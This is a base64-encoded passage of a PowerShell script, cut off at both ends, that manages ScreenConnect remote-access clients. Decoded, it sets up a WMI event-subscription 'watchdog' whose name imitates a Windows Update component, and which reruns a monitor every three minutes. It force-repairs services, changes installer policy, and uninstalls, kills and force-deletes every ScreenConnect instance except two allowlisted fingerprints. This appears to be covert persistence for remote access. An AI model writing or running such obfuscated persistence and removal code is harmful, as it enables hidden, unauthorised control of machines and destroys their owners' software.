ICAgICAgICAgaWYgKCRzcC5LZXkgLWVxICdUQVNLX0EnIC1vciAkc3AuS2V5IC1lcSAnVEFTS19C
JykgewogICAgICAgICAgICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1ROIGAi
JHRuYCIiIHwgT3V0LU51bGwKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAg
ICAgICRmYWlsKysKICAgICAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGVfRkFJTCAk
KCRzcC5LZXkpICR0biIKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gInRhc2tzIG9rPSRvayBy
ZWFybWVkPSRyZWFybWVkIGZhaWw9JGZhaWwiCn0KCmZ1bmN0aW9uIFJlbW92ZS1XYXRjaGRvZyB7
CiAgICBmb3JlYWNoICgkY2xzIGluIEAoJ19fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcnLCdfX0V2
ZW50RmlsdGVyJywnQ29tbWFuZExpbmVFdmVudENvbnN1bWVyJywnX19JbnRlcnZhbFRpbWVySW5z
dHJ1Y3Rpb24nKSkgewogICAgICAgIEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNj
cmlwdGlvbiAtQ2xhc3MgJGNscyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAg
ICAgICAgIFdoZXJlLU9iamVjdCB7CiAgICAgICAgICAgICAgICAoJF8uTmFtZSAtZXEgJ1d1Y2Fj
aGVXYXRjaGRvZ0YnKSAtb3IgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dDJykgLW9yCiAg
ICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRjaGRvZycpIC1vcgogICAg
ICAgICAgICAgICAgKCRfLkZpbHRlciAtYW5kICRfLkZpbHRlci5Ub1N0cmluZygpIC1saWtlICcq
V3VjYWNoZVdhdGNoZG9nRionKSAtb3IKICAgICAgICAgICAgICAgICgkXy5Db25zdW1lciAtYW5k
ICRfLkNvbnN1bWVyLlRvU3RyaW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicpCiAgICAg
ICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0LU51bGwgfQogICAg
fQp9CgpmdW5jdGlvbiBJbnN0YWxsLVdhdGNoZG9nIHsKICAgIGlmICgtbm90ICRNb25QYXRoKSB7
IHJldHVybiAkZmFsc2UgfQogICAgUmVtb3ZlLVdhdGNoZG9nCiAgICAkb2sgPSAkdHJ1ZQogICAg
dHJ5IHsKICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
biAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYAogICAgICAgICAgICAtQXJndW1l
bnRzIEB7IFRpbWVySWQgPSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxsaXNlY29uZHMg
PSAxODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51bGwKICAgICAgICAkZiA9
IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2
ZW50RmlsdGVyIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRj
aGRvZ0YnOyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5ndWFnZSA9ICdX
UUwnOwogICAgICAgICAgICAgICAgICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19U
aW1lckV2ZW50IFdIRVJFIFRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0KICAgICAgICAkYyA9
IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21t
YW5kTGluZUV2ZW50Q29uc3VtZXIgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAn
V3VjYWNoZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4ZSAvYyBgIiRN
b25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0KICAgICAgICBTZXQtV21pSW5z
dGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1
bWVyQmluZGluZyBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgRmlsdGVyID0gJGY7IENvbnN1
bWVyID0gJGMgfSB8IE91dC1OdWxsCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KICAgIHJl
dHVybiAkb2sKfQoKZnVuY3Rpb24gVGVzdC1XYXRjaGRvZ0dyYXBoIHsKICAgICR0ID0gR2V0LVdt
aU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGlt
ZXJJbnN0cnVjdGlvbiAtRmlsdGVyICJUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cnIiAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ug
cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0nV3Vj
YWNoZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAkYyA9IEdl
dC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExp
bmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGIgPSAkbnVsbAogICAgaWYgKCRmIC1hbmQgJGMp
IHsKICAgICAgICAkYiA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
biAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkZpbHRlciAtbGlrZSAnKld1
Y2FjaGVXYXRjaGRvZ0YqJyAtYW5kICRfLkNvbnN1bWVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9n
QyonIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICB9CiAgICByZXR1
cm4gW2Jvb2xdKCR0IC1hbmQgJGYgLWFuZCAkYyAtYW5kICRiKQp9CgpmdW5jdGlvbiBFbnN1cmUt
V2F0Y2hkb2cgewogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyByZXR1cm4gJ09LJyB9CiAg
ICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJ01JU1NJTkcnIH0KICAgIGlmIChJbnN0YWxs
LVdhdGNoZG9nKSB7IHJldHVybiAnUkVBUk1FRCcgfQogICAgcmV0dXJuICdGQUlMJwp9CgojIENv
cnJlY3QgMzItYml0ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBhIHRy
dW5jYXRlZAojIFdPVzY0MzJOb2RlIHBhdGggKG1pc3NpbmcgTWljcm9zb2Z0XFdpbmRvd3MpIHNv
IEVWRVJZIDMyLWJpdCBTQyBwcm9kdWN0CiMgd2FzIGludmlzaWJsZSB0byByZXBhaXIvZXh0ZXJt
aW5hdGUvcmVnaXN0ZXJlZC4KJHNjcmlwdDpVbmluc3RhbGxSb290cyA9IEAoCiAgICAnSEtMTTpc
U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJywKICAg
ICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVy
c2lvblxVbmluc3RhbGwnCikKCmZ1bmN0aW9uIFRlc3QtU0NSZWdpc3RlcmVkKFtzdHJpbmddJEZp
bmdlcnByaW50KSB7CiAgICAjIEw4OiBORVZFUiB1c2UgcmV0dXJuIGluc2lkZSBGb3JFYWNoLU9i
amVjdCAtIGl0IG9ubHkgZXhpdHMgdGhlCiAgICAjIHBpcGVsaW5lIGl0ZXJhdGlvbiwgc28gdGhp
cyBmdW5jdGlvbiBhbHdheXMgZmVsbCB0aHJvdWdoIHRvICdubycKICAgICMgYW5kIHRoZSBtb24g
b3JwaGFuLWxhZGRlciBkZWxldGVkIGhlYWx0aHkgcmVnaXN0ZXJlZCBzZXJ2aWNlcy4KICAgIGlm
ICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3Jp
cHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkg
eyBjb250aW51ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9v
dCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdl
dC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUp
LkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1h
bmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9CiAgICAg
ICAgfQogICAgfQogICAgcmV0dXJuICdubycKfQoKZnVuY3Rpb24gUmVwYWlyLVNDU2VydmljZShb
c3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBSZWNyZWF0ZXMgYSBkZWxldGVkIFNDIHNlcnZp
Y2UgZW50cnkgYnkgcmVwYWlyaW5nIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QuCiAgICAjIG1zaWV4
ZWMgL2ZhIHtHVUlEfSByZXBhaXJzIGluIHBsYWNlIC0gaXQgZG9lcyBOT1QgcnVuIHRoZSBTQy1m
YW1pbHkKICAgICMgbWFqb3ItdXBncmFkZSByZW1vdmFsLCBzbyBvdGhlciBpbnN0YW5jZXMgYXJl
IHVudG91Y2hlZC4KICAgICMgTDU6IGFsc28gaGFuZGxlcyBwcmVzZW50LWJ1dC1TVE9QUEVEIHNl
cnZpY2VzIChyZXBhaXIgcmVzdG9yZXMgYmluYXJpZXMsCiAgICAjIHRoZW4gc3RhcnQpLiBPbmx5
IGEgUnVubmluZyBzZXJ2aWNlIGlzIGNvbnNpZGVyZWQgaGVhbHRoeS4KICAgIGlmICgtbm90ICRG
aW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFt
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0
YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJ1bm5pbmcnIH0KICAgICRndWlkID0g
JG51bGwKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAg
ICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAgICAgICAgZm9y
ZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1Bh
dGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAg
IGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxp
a2UgJ3sqfScpKSB7ICRndWlkID0gJGtleS5QU0NoaWxkTmFtZTsgYnJlYWsgfQogICAgICAgIH0K
ICAgICAgICBpZiAoJGd1aWQpIHsgYnJlYWsgfQogICAgfQogICAgaWYgKC1ub3QgJGd1aWQpIHsg
cmV0dXJuICdub3QtcmVnaXN0ZXJlZCcgfQogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kg
L2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGlj
aWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdP
UkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIg
Im1zaV9yZXBhaXJfJEZpbmdlcnByaW50LmxvZyIKICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2ll
eGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvZmEgJGd1aWQgL3FuIC9ub3Jlc3RhcnQgL0wqdiBgIiRs
b2dgIiIgLVdhaXQgLVBhc3NUaHJ1CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA4CiAgICAmIHNj
LmV4ZSBjb25maWcgIiRuYW1lIiBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICYgc2Mu
ZXhlIHN0YXJ0ICIkbmFtZSIgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25k
cyA0CiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykg
eyByZXR1cm4gInN2Yy1yZXN0b3JlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICBpZiAoJHN2
YykgeyByZXR1cm4gInN2Yy1zdGlsbC1zdG9wcGVkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiIH0KICAg
IHJldHVybiAic3ZjLXN0aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRDb2RlKSIKfQoKZnVuY3Rp
b24gSW52b2tlLUV4dGVybWluYXRlIHsKICAgICMgTDc6IHRydWUgcmVtb3ZhbC4gQ29ycmVjdCBX
T1c2NDMyTm9kZSBoaXZlICsgbXNpZXhlYyArIFVuaW5zdGFsbFN0cmluZwogICAgIyBmYWxsYmFj
ayArIGZvcmNlIGRpciBudWtlLiBLZWVwIG9ubHkgdGhlIHR3byBhbGxvd2xpc3RlZCBmaW5nZXJw
cmludHMuCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdleHRlcm1pbmF0ZS5sb2cnCiAg
ICAka2VlcCA9IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JykKICAgICRu
ID0gQHsgc3ZjID0gMDsgcHJvYyA9IDA7IGRpciA9IDA7IHByb2R1Y3QgPSAwOyBybW0gPSAwOyBm
YWlsID0gMCB9CiAgICBmdW5jdGlvbiBMb2coW3N0cmluZ10kbSkgewogICAgICAgICRsaW5lID0g
J3swfSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzJyksICRt
CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRsaW5lIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgV3JpdGUtT3V0cHV0ICRsaW5lCiAgICB9
CiAgICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlmICgtbm90ICRz
KSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgIGZvcmVhY2ggKCRrIGluICRrZWVwKSB7IGlmICgk
cyAtbGlrZSAiKiRrKiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgIHJldHVybiAkZmFsc2UK
ICAgIH0KICAgIGZ1bmN0aW9uIEZvcmNlLVJlbW92ZURpcihbc3RyaW5nXSRkKSB7CiAgICAgICAg
aWYgKC1ub3QgJGQgLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IHJldHVy
biAkdHJ1ZSB9CiAgICAgICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5FeGVj
dXRhYmxlUGF0aCAtYW5kICRfLkV4ZWN1dGFibGVQYXRoLlN0YXJ0c1dpdGgoJGQsIFtTdHJpbmdD
b21wYXJpc29uXTo6T3JkaW5hbElnbm9yZUNhc2UpIH0gfAogICAgICAgICAgICBGb3JFYWNoLU9i
amVjdCB7IFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSB9CiAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+
JjEgfCBPdXQtTnVsbAogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJypTLTEtNS0zMi01
NDQ6RicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBpY2FjbHMuZXhlICRkIC9n
cmFudCAnQWRtaW5pc3RyYXRvcnM6RicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsCiAgICAgICAg
UmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7
CiAgICAgICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAtaCAtcyAtciAvcyAvZCBgIiRkXCouKmAi
IiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgY21kLmV4ZSAvYyAicm1kaXIgL3MgL3EgYCIk
ZGAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICB9CiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0
ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgJGVtcHR5ID0gSm9pbi1QYXRoICRlbnY6VEVNUCAo
Im93bl9lbXB0eV8iICsgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkKICAgICAgICAg
ICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZW1wdHkgLUZvcmNlIHwgT3V0
LU51bGwKICAgICAgICAgICAgJiByb2JvY29weS5leGUgJGVtcHR5ICRkIC9NSVIgL1I6MCAvVzow
IDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGVt
cHR5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICBSZW1v
dmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICAgICAgfQogICAgICAgIHJldHVybiAtbm90IChUZXN0LVBhdGggLUxp
dGVyYWxQYXRoICRkKQogICAgfQogICAgZnVuY3Rpb24gVW5pbnN0YWxsLVByb2R1Y3RLZXkoJGtl
eSkgewogICAgICAgICRndWlkID0gJGtleS5QU0NoaWxkTmFtZQogICAgICAgICRwcm9wID0gR2V0
LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQog
ICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlOYW1lCiAgICAgICAgaWYgKCRndWlkIC1saWtlICd7
Kn0nKSB7CiAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1l
bnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MiIC1X
YWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgIExvZyAicHJvZHVj
dF9tc2lleGVjIFskZG5dIGd1aWQ9JGd1aWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAgICAg
ICAgaWYgKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKSB7IHJldHVybiAkdHJ1
ZSB9CiAgICAgICAgfQogICAgICAgICR1cyA9ICRwcm9wLlVuaW5zdGFsbFN0cmluZwogICAgICAg
IGlmICgkdXMpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICgkdXMgLW1h
dGNoICcoP2kpbXNpZXhlYycpIHsKICAgICAgICAgICAgICAgICAgICAkYXJncyA9ICgkdXMgLXJl
cGxhY2UgJyg/aSleLiptc2lleGVjKFwuZXhlKT9ccyonLCAnJykKICAgICAgICAgICAgICAgICAg
ICBpZiAoJGFyZ3MgLW5vdG1hdGNoICcvcW4nKSB7ICRhcmdzID0gIiRhcmdzIC9xbiAvbm9yZXN0
YXJ0IiB9CiAgICAgICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhl
IC1Bcmd1bWVudExpc3QgJGFyZ3MgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4K
ICAgICAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3RfdW5pbnN0YWxsc3RyaW5nX21zaSBbJGRu
XSBleGl0PSQoJHAuRXhpdENvZGUpIgogICAgICAgICAgICAgICAgICAgIHJldHVybiAoJHAuRXhp
dENvZGUgLWluIDAsIDE2MDUsIDE2MTQsIDMwMTApCiAgICAgICAgICAgICAgICB9IGVsc2Ugewog
ICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBjbWQuZXhlIC1Bcmd1bWVudExp
c3QgIi9jICR1cyAvUyAvc2lsZW50IC9xdWlldCAvcW4iIC1XYWl0IC1QYXNzVGhydSAtV2luZG93
U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0
cmluZ19leGUgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAgICAgICAgICAgICAgICBy
ZXR1cm4gKCRwLkV4aXRDb2RlIC1lcSAwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9
IGNhdGNoIHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19GQUlMIFskZG5dICRfIiB9CiAg
ICAgICAgfQogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KCiAgICBMb2cgJ2V4dGVybWluYXRl
X2VuZ2luZV9MN19iZWdpbicKCiAgICAjIDEuIGZvcmVpZ24gU0MgcHJvZHVjdHMgZnJvbSBCT1RI
IGNvcnJlY3QgQVJQIGhpdmVzCiAgICAkc2VlbiA9IEB7fQogICAgZm9yZWFjaCAoJHJvb3QgaW4g
JHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJv
b3QpKSB7IExvZyAiaGl2ZV9taXNzaW5nICRyb290IjsgY29udGludWUgfQogICAgICAgIExvZyAi
aGl2ZV9zY2FuICRyb290IgogICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRwcm9wID0g
R2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUK
ICAgICAgICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUKICAgICAgICAgICAgaWYgKC1ub3Qg
JGRuKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkZG4gLW5vdG1hdGNoICcoP2kpU2NyZWVu
Q29ubmVjdFxzK0NsaWVudFxzKlwoKFswLTlBLUZhLWZdezE2fSlcKScpIHsgcmV0dXJuIH0KICAg
ICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAgICAgICAgIGlmICgkZnAg
LWluICRrZWVwKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgk
Xy5QU0NoaWxkTmFtZSkpIHsgcmV0dXJuIH0KICAgICAgICAgICAgJHNlZW5bJF8uUFNDaGlsZE5h
bWVdID0gJHRydWUKICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7ICRu
LnByb2R1Y3QrKyB9IGVsc2UgeyAkbi5mYWlsKys7IExvZyAicHJvZHVjdF9SRU1PVkVfRkFJTEVE
IFskZG5dIiB9CiAgICAgICAgfQogICAgfQoKICAgICMgMi4gZm9yZWlnbiBTQyBzZXJ2aWNlcwog
ICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENsaWVu
dConIH0pKSB7CiAgICAgICAgaWYgKElzLUtlZXBlciAkc3ZjLk5hbWUpIHsgY29udGludWUgfQog
ICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAg
ICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDAKICAgICAgICAmIHNjLmV4ZSBkZWxldGUg
IiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJG4uc3ZjKys7IExvZyAic3Zj
X2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIgogICAgfQoKICAgICMgMy4gZm9yZWlnbiBTQyBwcm9jZXNz
ZXMgKGtpbGwgZXZlbiB3aGVuIEV4ZWN1dGFibGVQYXRoIGlzIG51bGwpCiAgICBHZXQtQ2ltSW5z
dGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAg
JGV4ZSA9ICRfLkV4ZWN1dGFibGVQYXRoCiAgICAgICAgJGNtZCA9ICRfLkNvbW1hbmRMaW5lCiAg
ICAgICAgJGtlZXBlciA9IChJcy1LZWVwZXIgJGV4ZSkgLW9yIChJcy1LZWVwZXIgJGNtZCkKICAg
ICAgICBpZiAoLW5vdCAka2VlcGVyKSB7CiAgICAgICAgICAgIFN0b3AtUHJvY2VzcyAtSWQgJF8u
UHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAg
ICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQgcGlkPSQoJF8uUHJvY2Vzc0lkKSBleGU9JGV4
ZSIKICAgICAgICB9CiAgICB9CgogICAgIyA0LiBmb3JlaWduIFNDIGluc3RhbGwgZGlycyAoUEYg
KyBQRjg2KQogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgkZW52OlByb2dyYW1GaWxlcywgJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9KSkgewogICAgICAgIGlmICgtbm90ICRiYXNlIC1vciAtbm90IChU
ZXN0LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVlIH0KICAgICAgICBHZXQtQ2hpbGRJdGVtIC1MaXRl
cmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNv
bm5lY3QqJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJGQgPSAkXy5GdWxs
